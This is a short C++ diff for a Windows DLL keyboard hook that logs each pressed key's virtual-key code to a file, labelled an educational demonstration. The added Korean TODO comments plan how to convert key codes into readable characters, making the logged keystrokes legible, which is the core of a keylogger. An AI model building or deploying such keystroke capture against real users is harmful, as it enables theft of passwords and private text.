@@ -12,6 +12,19 @@ extern "C" __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM
         if (wParam == WM_KEYDOWN) {
             KBDLLHOOKSTRUCT* pKbdStruct = (KBDLLHOOKSTRUCT*)lParam;
 
+            // TODO: VK 코드를 ASCII 문자로 변환
+            // - VK=0x41 → 'A' (또는 Shift 상태에 따라 'a')
+            // - VK=0x08 → [BACKSPACE]
+            // - VK=0x20 → ' ' (Space)
+            // - VK=0x0D → '\n' (Enter)
+            // - VK=0x14 → [CAPSLOCK]
+            // - VK=0xA0, 0xA1 → [SHIFT]
+            // - VK=0xA2, 0xA3 → [CTRL]
+            // - VK=0x5B, 0x5C → [WIN]
+            // - GetAsyncKeyState(VK_SHIFT)로 Shift 상태 확인
+            // - GetAsyncKeyState(VK_CAPITAL)로 CapsLock 상태 확인
+            // 구현 시 MapVirtualKeyA(), ToAscii() 등 사용 가능
+
             // Log to file for educational demonstration
             if (g_logFile) {
                 fprintf(g_logFile, "[HOOK] Key pressed: VK=0x%02X\n", pKbdStruct->vkCode);
